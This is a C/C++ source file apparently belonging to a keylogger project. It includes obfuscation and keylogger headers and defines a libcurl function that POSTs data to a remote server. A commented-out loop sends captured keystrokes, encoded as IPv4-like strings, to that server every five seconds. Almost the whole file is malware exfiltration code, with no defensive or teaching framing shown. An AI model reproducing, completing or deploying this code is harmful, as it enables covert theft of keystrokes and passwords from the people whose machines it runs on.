#include <stdio.h>
#include <curl/curl.h>
#include <cstdio>
#include <thread>
#include <chrono>
#include "Obfuscation.h"
#include "Keylogger.h"


int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address) {
	CURL* curl;
	CURLcode res;

	// Initialize curl
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		// Sepcify the server URL
		curl_easy_setopt(curl, CURLOPT_URL, serverUrl);

		// Specify the POST data
		const char* postData = "ipv4="; // key for the parameter
		char fullData[512];

		snprintf(fullData, sizeof(fullData), "%s%s", postData, ipv4Address);

		// Set the POST data to be sent
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fullData);

		// Perform the POST request
		res = curl_easy_perform(curl);

		// Check if the request was successful
		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() faild: %s\n", curl_easy_strerror(res));
			curl_easy_cleanup(curl);
			curl_global_cleanup();
			return 1;
		}

		// Clean up
		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();
	return 0;
}


//void sendToServerPeriodically(MemoryRegion* memRegion, const char* serverUrl) {
	//while (true) {
		//if (memRegion->used > 0) {  // Check if there are keystrokes to send
			//if (!GenerateIpv4Output((unsigned char*)memRegion->baseAddress, memRegion->used, serverUrl)) {
				//fprintf(stderr, "Failed to send keystrokes to the server.\n");
		//	}
			//else {
				//printf("Keystrokes sent to the server.\n");
			//}
		//}
		// Wait for 5 seconds before sending again
		//std::this_thread::sleep_for(std::chrono::seconds(5));
	//}
//}